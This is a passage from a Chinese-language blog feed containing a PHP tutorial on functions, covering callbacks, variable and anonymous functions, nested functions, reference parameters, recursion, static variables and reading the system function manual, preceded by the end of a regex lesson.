<td align="left">传入数组，执行一个正则表达式搜索和替换使用回调</td>
</tr>
<tr>
<td align="center">preg_replace_callback</td>
<td align="left">执行一个正则表达式搜索并且使用一个回调进行替换</td>
</tr>
<tr>
<td align="center">preg_replace</td>
<td align="left">执行一个正则表达式的搜索和替换</td>
</tr>
<tr>
<td align="center">preg_split</td>
<td align="left">通过一个正则表达式分隔字符串</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br><strong>正则关于面试常遇到的问题</strong><br>面试中经常考到的几个正则达达示是：</p>
<ol>
<li>匹配邮箱</li>
<li>匹配手机号</li>
<li>匹配一个网址</li>
<li>用正则匹配某个格式，取出某个例</li>
<li>写一个采集器<br>其他….</li>
</ol>
<p>面试的第4题和第5题我对大家不担心，因为只要大家认真学习了我给的前五节的内容。第4，5题推理就行。<br>因为，通常在技术答题面试环节，是时候准许查手机的！  ヾ(๑╹◡╹)ﾉ”</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-函数</title>
    <url>/post/PHP-function/</url>
    <content><![CDATA[<p>PHP函数分为<font color="red"><strong>自定义函数</strong></font>和<font color="red"><strong>系统函数</strong></font> (oﾟvﾟ)ノ</p>
<span id="more"></span>

<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP 函数</font></center>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="一-自定义函数"><a href="#一-自定义函数" class="headerlink" title="一. 自定义函数"></a><font color="#FF6347" face="Comic sans MS">一. 自定义函数</font></h3><h4 id="1-1-自定义函数函数基本概念"><a href="#1-1-自定义函数函数基本概念" class="headerlink" title="1.1 自定义函数函数基本概念"></a><font color="#3CB371" face="Comic sans MS">1.1 自定义函数函数基本概念</font></h4><p><font face="Comic sans MS">我们在实际开发过程当中需要有很多功能都需要反复使用到，而这些反复需要使用到的功能，我们能定义成功能（函数），就尽可能定义成功能（函数）。使用的时候，吼一下它的名字即可。<br>  那我们来学一下自定义函数的语法规定，语法规定如下：<br><font color="red"><br>  function 函数名([参数名1[&#x3D;值1], 参数名2[&#x3D;值2], 参数名n[&#x3D;值n]])<br>{<br>       函数中的功能体<br>    [return 返回值]<br>}<br></font><br></font></p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**上面的语法规定中发现了如下特点，产生如下语未能规定：**</font>
1. 函数以<font color="red">**function**</font>开始
2. function后面接空格，空格后接函数名
3. 函数名与变量命名规则基本一样，但是不同的是：<font color="red">**函数名不区分大小写**</font>
4. 所谓参数其实就是变量
5. 函数名后接括号，括号内跟参数，参数全都有[]（中括号）括起来了，代表参数可填可不填
6. 如果有参数的话，参数后可以接(＝)等号，等号接默认值。参数值也是用[](中括号)括起来的，代表选填
7. 函数后的参数变量，主要功能是把函数体外的变量值，传入函数体内来使用，函数体的变量和函数体外的
   变量通常是两个不同的变量。
8. 函数中的具体功能（功能体）用大括号括起来，代表这是一个函数的功能区间
9. 函数可以有返回值也可以没有返回值，用[]（中括号）括起来的，代表选填。
10. return后接空格，空格后接返回值，若有return,return后的代码均不执行。(<font color="red">**return可用可不用**</font>)
11. 函数的执行没有顺序关系，可以在定义处之前的位置调用
12. 函数不能被定义两次，即函数不能被重载
</font></td></tr></table>

<p>&amp;emsp;</p>
<blockquote>
<p><font color="#00B2EE"><strong>1. 函数是条狗，哪里调用哪里哪，它就跟着你走</strong></font><br><font color="#00B2EE"><strong>2. 函数名只能是字母，数字，下划线的组合，并且之间不能包含空格，数字不能放在变量名首位。</strong></font><br><font color="#00B2EE"><strong>3. 函数名与变量命名规则一样，但是不同的是：</strong><font color="red"><strong>函数名不区分大小写</strong></font> </font><br><font color="#00B2EE"><strong>4. 函数体的参数若是定义了，未传参数，代码会报错</strong></font><br><font color="#00B2EE"><strong>5. 函数的参数如果有默认值，参数可以不填，代码也不会报错</strong></font><br><font color="#00B2EE"><strong>6. 函数的参数可以写多个</strong></font><br><font color="#00B2EE"><strong>7. 函数如果有默认值和无默认值的参数，通常把无默认值的参数写在最前面</strong></font><br><font color="#00B2EE"><strong>8. 函数体的变量与函数体外的变量没有关系</strong></font><br><font color="#00B2EE"><strong>9. 函数体中若有return,return 后的代码不执行</strong></font><br><font color="#00B2EE"><strong>10. 函数执行完后,return 可把函数体内的值，带带函数体外</strong></font><br><font color="#00B2EE"><strong>11. 函数的执行没有顺序关系，可以在定义处之前的位置调用</strong></font><br><font color="#00B2EE"><strong>12. 函数不能重载</strong></font></p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-2-回调函数"><a href="#1-2-回调函数" class="headerlink" title="1.2 回调函数"></a><font color="#3CB371" face="Comic sans MS">1.2 回调函数</font></h4><p><strong>一个函数作为另外一个函数的</strong><font color="red"><strong>参数</strong></font>。</p>
<p><font face="Comic sans MS">回调函数，可以配合匿名函数和变量函数实现更加优美、复杂的一种函数结构。<br>回调函数，就是在处理一个功能的时候，我让让这个功能自定义能力再强一些，我准许调用这个函数的时候，还可以传入一个函数配合、协助进行处理。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> woziji(<span class="variable">$one</span>,<span class="variable">$two</span>,<span class="variable">$func</span>)&#123;</span><br><span class="line">       //我规定：检查<span class="variable">$func</span>是否是函数，如果不是函数停止执行本段代码，返回<span class="literal">false</span></span><br><span class="line">       <span class="keyword">if</span>(!is_callable(<span class="variable">$func</span>))&#123;</span><br><span class="line">               <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       //我把<span class="variable">$one</span>、<span class="variable">$two</span>相加，再把<span class="variable">$one</span>和<span class="variable">$two</span>传入<span class="variable">$func</span>这个函数中处理一次</span><br><span class="line">       //<span class="variable">$func</span>是一个变量函数，参见变量函数这一章</span><br><span class="line">       <span class="built_in">echo</span> <span class="variable">$one</span> + <span class="variable">$two</span> + <span class="variable">$func</span>(<span class="variable">$one</span>,<span class="variable">$two</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//我们定义几个函数试试</span><br><span class="line"><span class="keyword">function</span> plusx2( <span class="variable">$foo</span> , <span class="variable">$bar</span>)&#123;</span><br><span class="line">       <span class="variable">$result</span> = (<span class="variable">$foo</span>+<span class="variable">$bar</span>)*2;</span><br><span class="line">       <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> jian( <span class="variable">$x</span> , <span class="variable">$y</span> )&#123;</span><br><span class="line">   <span class="variable">$result</span> = <span class="variable">$x</span> - <span class="variable">$y</span>;</span><br><span class="line">   <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line">//调用一下函数，woziji，向里面传入参数试试</span><br><span class="line"><span class="built_in">echo</span> woziji(20,10,<span class="string">&#x27;plusx2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">//将plusx2改成jian试试结果</span><br><span class="line"><span class="built_in">echo</span> woziji(20,10,<span class="string">&#x27;jian&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>处理过程是这样的:</strong><br>    1.将20赋值给形参$one,10赋值给了$two，而plusx2或者jian这两个变量函数，赋值给了$func<br>    2.在woziji这个函数中判断plusx2或者jian是否为函数，不是函数就return false 停止执行了<br>    3.显示plusx2或者jian是函数。因此$one &#x3D; 20, $two &#x3D;10相加了，相加后，$one和$two又带入到了了$func($one,$two)中。<br>    4.带入至里面后而$func，是可变的，可以为plusx2或者jian。如果为plusx2的话，$one &#x3D; 20,$two &#x3D; 10 的这个两个结果又给        了plusx2函数里面的$foo和$bar<br>    5.$foo + $bar 乘以2后将结果返回至woziji这个函数功能体的运算处：$one + $two + $func($one,$two);<br>    6.这样得到了运算结果<br>现在我们明白了回调函数：在一个调数里面，再传入一个函数名，将函数名加上()括号。识为变量函数，配合执行。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-3-变量函数"><a href="#1-3-变量函数" class="headerlink" title="1.3 变量函数"></a><font color="#3CB371" face="Comic sans MS">1.3 变量函数</font></h4><p><font color="red"><strong>function demo(){}<br>$fu &#x3D; ‘demo’;<br>$fu();</strong><br></font></p>
<p>&amp;emsp;<br><font face="Comic sans MS">在之前的变量部份，我们学习了可变变量。可变函数仅仅是可变变量的一个变种、变形表达。<br><font color="#00B2EE"><strong>可变函数</strong></font>，我们也会称呼为变量函数。简单回顾一下之前的知识点：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$hello</span> = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="variable">$world</span> = <span class="string">&#x27;你好&#x27;</span>;</span><br><span class="line"><span class="comment">//输出的结果为：你好</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$hello</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>因为$hello先被解释成了world，再world前加上$符就输出了：你好。</p>
</blockquote>
<p>&amp;emsp;<br>而<font color="#00B2EE"><strong>变量函数</strong></font>的用法是这样的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;天王盖地虎&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;小鸡炖蘑菇&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fu</span> = <span class="string">&#x27;demo&#x27;</span>;</span><br><span class="line"><span class="comment">//把$fu变为了demo,把demo后加上了一个括号，就执行函数了</span></span><br><span class="line"><span class="variable">$fu</span>();</span><br><span class="line"><span class="comment">//把$fu的值改为test字符串再试试？</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-4-匿名函数"><a href="#1-4-匿名函数" class="headerlink" title="1.4 匿名函数"></a><font color="#3CB371" face="Comic sans MS">1.4 匿名函数</font></h4><p><strong>匿名函数，也就是</strong><font color="red"><strong>没有函数名的函数。</strong></font></p>
<p>匿名函数的第一种用法，直接把赋数赋值给变量，调用变量即为调用函数。<br>匿名函数的写法比较灵活。</p>
<p><font color="#00B2EE"><strong>1.变量函数式的匿名函数</strong></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$greet</span> = <span class="keyword">function</span>(<span class="variable">$name</span>)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="built_in">echo</span> <span class="variable">$name</span>.<span class="string">&#x27;，你好&#x27;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$greet</span>(<span class="string">&#x27;明天&#x27;</span>);</span><br><span class="line"><span class="variable">$greet</span>(<span class="string">&#x27;PHP中文网&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>上例中的函数体没有函数名，通过$greent加上括号来调用的，这就是匿名函数。</p>
</blockquote>
<p>&amp;emsp;<br><font color="#00B2EE"><strong>2.回调式的匿名函数</strong></font><br>实际使用场景中，我们要通过一个函数实现更多的功能。但是，我又不想专门定义一个函数。我们回顾一下，我们回调函数的例子：</p>
<p><font face="Comic sans MS"></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> woziji(<span class="variable">$one</span>,<span class="variable">$two</span>,<span class="variable">$func</span>)&#123;</span><br><span class="line">       //我规定：检查<span class="variable">$func</span>是否是函数，如果不是函数停止执行本段代码，返回<span class="literal">false</span></span><br><span class="line">       <span class="keyword">if</span>(!is_callable(<span class="variable">$func</span>))&#123;</span><br><span class="line">               <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       //我把<span class="variable">$one</span>、<span class="variable">$two</span>相加，再把<span class="variable">$one</span>和<span class="variable">$two</span>传入<span class="variable">$func</span>这个函数中处理一次</span><br><span class="line">       //<span class="variable">$func</span>是一个变量函数，参见变量函数这一章</span><br><span class="line">       <span class="built_in">echo</span> <span class="variable">$one</span> + <span class="variable">$two</span> + <span class="variable">$func</span>(<span class="variable">$one</span>,<span class="variable">$two</span>);</span><br><span class="line">&#125;</span><br><span class="line">woziji(20,30,<span class="keyword">function</span>( <span class="variable">$foo</span> , <span class="variable">$bar</span>)&#123;</span><br><span class="line">               <span class="variable">$result</span> = (<span class="variable">$foo</span>+<span class="variable">$bar</span>)*2;</span><br><span class="line">               <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">           &#125;</span><br><span class="line">);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>仔细推理一下过程哟。只不过在之前的章节当中，plusx2换成了我们的匿名函数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span>( <span class="variable">$foo</span> , <span class="variable">$bar</span>)&#123;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$result</span> = (<span class="variable">$foo</span>+<span class="variable">$bar</span>)*2;</span><br><span class="line"></span><br><span class="line">       <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>因此，函名函数在调用的时候没有函数名。我们可以采用以上的一些方法来使用匿名函数。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-5-内部函数"><a href="#1-5-内部函数" class="headerlink" title="1.5 内部函数"></a><font color="#3CB371" face="Comic sans MS">1.5 内部函数</font></h4><p><strong>内部函数，是指</strong><font color="red"><strong>在函数内部又声明了一个函数。</strong></font></p>
<p><font face="Comic sans MS"><strong>注意事项：</strong></p>
<ol>
<li>内部函数名，不能是已存在的函数名</li>
<li>假设在函数a里面定义了一个内部函数，不能定用两次函数a。</font></li>
</ol>
<p>我们下面来看代码，你将很快的学习会：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> foo()</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;我是函数foo哟，调一下我才会执行定义函数bar的过程&lt;br /&gt;&#x27;</span>;</span><br><span class="line"> <span class="keyword">function</span> bar()</span><br><span class="line"> &#123;</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&#x27;在foo函数内部有个函数叫bar函数&lt;br /&gt;&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//现在还不能调用bar()函数，因为它还不存在</span><br><span class="line">//bar(); //如果现在调用会报错</span><br><span class="line">foo();</span><br><span class="line"></span><br><span class="line">//现在可以调用bar()函数了，因为foo()函数的执行使得bar()函数变为已定义的函数</span><br><span class="line">bar();</span><br><span class="line">//再调一次foo()看看是不是会报错？  会报错</span><br><span class="line">foo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>仔细观察和实验后你会得出如下的结论：<br>   1.foo()调用两次会报错<br>   2.如果不调foo()函数无法执行bar函数，因为bar是在foo的内部</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-6-参数的引用"><a href="#1-6-参数的引用" class="headerlink" title="1.6 参数的引用"></a><font color="#3CB371" face="Comic sans MS">1.6 参数的引用</font></h4><p>在变量这个函数中，我们学习了变量的引用，我们来回顾一下知识：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = &amp;<span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&#x27;---------&#x27;</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>上述知识点的在变量章节中，变量引用有讲述，是指变量$a和$b指向到了同一个存储位置，来存值。</p>
</blockquote>
<p>&amp;emsp;<br><font color="#FF7F00"><strong>而函数的参数引用，也是这个意思，将形参和实参指向到同一个位置。如果形参在函数体内发生变化，那么实参的值也发生变化。我们来通过实验来看看：</strong></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$foo</span> = 100;</span><br><span class="line"></span><br><span class="line">//注意：在<span class="variable">$n</span>前面加上了&amp;符</span><br><span class="line"><span class="keyword">function</span> demo(&amp;<span class="variable">$n</span>)&#123;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$n</span> = 10;</span><br><span class="line"></span><br><span class="line">       <span class="built_in">return</span> <span class="variable">$n</span> + <span class="variable">$n</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span>  demo(<span class="variable">$foo</span>).<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//你会发生<span class="variable">$foo</span>的值变为了10</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$foo</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>通过上例，我们发现实参为$foo，在调用demo的时候，<font color="red"><strong>让$foo和$n指向到了同一个存储区域</strong></font>，当$n的值发生变化的时候。那么$foo的值也发生变化。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-7-递归函数"><a href="#1-7-递归函数" class="headerlink" title="1.7 递归函数"></a><font color="#3CB371" face="Comic sans MS">1.7 递归函数</font></h4><p>递归函数，递归只是一个名字，而递归函数的规定：<font color="red"><strong>函数体内调用函数自己</strong></font>。<br>递归在实际工作中主要是用在：<font color="red"><strong>文件和文件夹操作</strong></font>的时候有使用到。</p>
<p><font face="Comic sans MS"><font color="#00B2EE"><strong>几个思维上的盲区：</strong></font><br>  1.代码是从上到下执行的，所有代码没有exit等停止符，函数必须执行完。<br>  2.如果函数从函数A跳至函数B后，必须把函数B执行完成再执行函数A余下的代码。<br>  3.递归函数必须要能执行完有结束条件，不然函数就会限入死循环。函数会永远的自我执行下去。<br></font></p>
<p>我们来写一代码码来理解一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$num</span> = 10;</span><br><span class="line">//调用一次函数A();</span><br><span class="line">A(<span class="variable">$num</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> A( <span class="variable">$arg</span> )&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$arg</span>;</span><br><span class="line">   //在函数A里面去，跑去执行函数B去了</span><br><span class="line">   B(<span class="variable">$arg</span>);</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;我们需要不断的努力，努力到上天都为我们感动&#x27;</span>;</span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$arg</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> B( <span class="variable">$number</span> )&#123;</span><br><span class="line">       <span class="built_in">echo</span> <span class="variable">$number</span>;</span><br><span class="line">       <span class="built_in">echo</span> <span class="string">&#x27;俺是狗蛋，执行完了&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>结论：</strong><br>1.执行函数A到一半的时候，跑去执行了函数B<br>2.执行完函数B，先显示出来的是：“俺是狗蛋，执行完了”，接着显示的才是：“我们需要不断的努力，努力到上天都为我们感动”<br>3.也就是证明了我们所说思维盲区里面的内容，代码从上到下执行，代码必须执行完。</p>
</blockquote>
<p>&amp;emsp;<br>  我们来写一个简单的递归代码,让函数自己调用自己。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$n</span> = <span class="number">2</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dg</span>(<span class="params"> <span class="variable">$n</span> </span>)</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$n</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">   <span class="variable">$n</span> = <span class="variable">$n</span> - <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$n</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">       <span class="comment">//在函数体内调用了dg自己哟</span></span><br><span class="line">       dg(<span class="variable">$n</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;--------------&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;俺是狗蛋，俺还没执行&#x27;</span> . <span class="variable">$n</span> . <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>我们来仔细推理一次：<br>   1.第一次调用dg()，将数字$n &#x3D; 2传到dg中，先显示出来了2<br>   2.然后将$n - 1 $n的值为了1<br>   3.接着判断$n 是否大于0,肯定是大于0的，所以调用递归自己，再把自己执行一次。<br>   4.而第二次在执行自己dg()的时候，而最下面的 echo ‘俺是狗蛋，俺还没执行’ . $n . ‘<br>‘; 还没有执行到。等待执行完成后再来执行<br>   5.$n此时等于1 ，所以显示出来1。<br>   6.$n把自己减了一次，$n的结果为0<br>   7.$n大于0肯定不成立的，所以显示了一条:”————–”<br>   8.而这个时候该执行：echo ‘俺是狗蛋，俺还没执行’ . $n . ‘<br>‘;<br>   9.第二次执行dg()执行完成。第一次dg()的代码还没执行完，将第4点中的余下代码执行完。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-8-静态变量"><a href="#1-8-静态变量" class="headerlink" title="1.8 静态变量"></a><font color="#3CB371" face="Comic sans MS">1.8 静态变量</font></h4><p><font face="Comic sans MS"><font color="red"><strong>静态变量的特点是：</strong></font>声明一个静态变量，第二次调用函数的时候，静态变量不会再初始化变量，会在原值的基础上读取执行。<br>实际上:全局变量本身就是静态存储方式,<font color="red"><strong>所有的全局变量都是静态变量</strong></font><br></font></p>
<p><font color="#FF7F00"><strong>以下讲述局部静态变量和全局静态变量：</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//--------------如何理解static静态变量-----------</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/** 普通局部变量 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">local</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="variable">$loc</span> = <span class="number">0</span>; <span class="comment">//这样，如果直接不给初值0是错误的。</span></span><br><span class="line"> ++<span class="variable">$loc</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$loc</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">local(); <span class="comment">//1</span></span><br><span class="line">local(); <span class="comment">//1</span></span><br><span class="line">local(); <span class="comment">//1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;===================================&lt;br/&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/** static静态局部变量 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">static_local</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="built_in">static</span> <span class="variable">$local</span> = <span class="number">0</span> ; <span class="comment">//此处可以不赋0值</span></span><br><span class="line"> <span class="variable">$local</span>++;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$local</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">static_local(); <span class="comment">//1</span></span><br><span class="line">static_local(); <span class="comment">//2</span></span><br><span class="line">static_local(); <span class="comment">//3</span></span><br><span class="line"><span class="comment">//echo $local; 注意虽然静态变量，但是它仍然是局部的，在外不能直接访问的。</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;=======================================&lt;br&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/** static静态全局变量(实际上:全局变量本身就是静态存储方式,所有的全局变量都是静态变量) */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">static_global</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="keyword">global</span> <span class="variable">$glo</span>; <span class="comment">//此处，可以不赋值0，当然赋值0，后每次调用时其值都为0，每次调用函数得到的值都会是1，</span></span><br><span class="line"> <span class="comment">//但是不能想当然的写上&quot;static&quot;加以修饰，那样是错误的.</span></span><br><span class="line"> <span class="variable">$glo</span>++;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$glo</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">static_global(); <span class="comment">//1</span></span><br><span class="line">static_global(); <span class="comment">//2</span></span><br><span class="line">static_global(); <span class="comment">//3</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="二-系统函数"><a href="#二-系统函数" class="headerlink" title="二. 系统函数"></a><font color="#FF6347" face="Comic sans MS">二. 系统函数</font></h3><h4 id="2-1-使用介绍"><a href="#2-1-使用介绍" class="headerlink" title="2.1 使用介绍"></a><font color="#3CB371" face="Comic sans MS">2.1 使用介绍</font></h4><p><font color="#00B2EE">[<a href="http://www.php.cn/">PHP手册下载</a>]</font></p>
<ol>
<li>如果代码能赚钱，帮你赚钱最多的是基本语法</li>
<li>如果你还在当程序员，你看手册的时间可能比你看老婆的时间还长</li>
</ol>
<p><font face="Comic sans MS">使用函数的重点是三块：<br>    1.了解函数的<font color="red">功能</font>，特别是常用函数的功能<br>    2.了解函数的<font color="red">参数</font><br>    3.了解函数的<font color="red">返回值</font><br></font></p>
<blockquote>
<p>我们针对上面的三块，讲解6个函数，这6个函数，概况了函数的基本用法的全部注意事项：<br><font color="#00B2EE"><strong>1. 直接返回布尔型，如bool copy ()<br>2. 带有MIXED参数的函数如何调用。Mixed表示任何类型的数据。如Array_unshift()<br>3. 参数中带有&amp;符的参数，一定要传一个变量做为参数。函数里面改变了他的值。<br>4. 带有[]的参数，表示可选项。<br>5. 带有…的参数，表示可以传任意多个参数。<br>6. 带有callback的参数，表示回调函数。需要传一个函数进来。Array_map()<br>7. 函数支持的版本要了解。</strong><br></font></p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. 直接返回布尔型</strong></font><br><font color="red"><strong>bool</strong></font> <strong>copy ( string $source , string $dest [, resource $context ] )</strong><br></font></p>
<blockquote>
<p><strong>这个函数的功能为：</strong> 拷备一个文件<br><strong>返回值为为：</strong> bool型值，就是成功返回true，失败返回false<br><strong>参数为：</strong> 两个字符串的值，一个是copy的源文件，一个为目标文件。第三个参数可选的，不常用，我们不管它。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(copy(<span class="string">&#x27;abc.txt&#x27;</span>,<span class="string">&#x27;bcd.txt&#x27;</span>))&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;复制成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;复制失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>2. Mixed表示任何类型的数据。如Array_unshift()</strong></font> </font><br><font color="red"><strong>int</strong></font> array_unshift ( array &amp;$array , <font color="red"><strong>mixed</strong></font>  $value1 [, mixed $… ] )</p>
<p><font face="Comic sans MS"></font></p>
<blockquote>
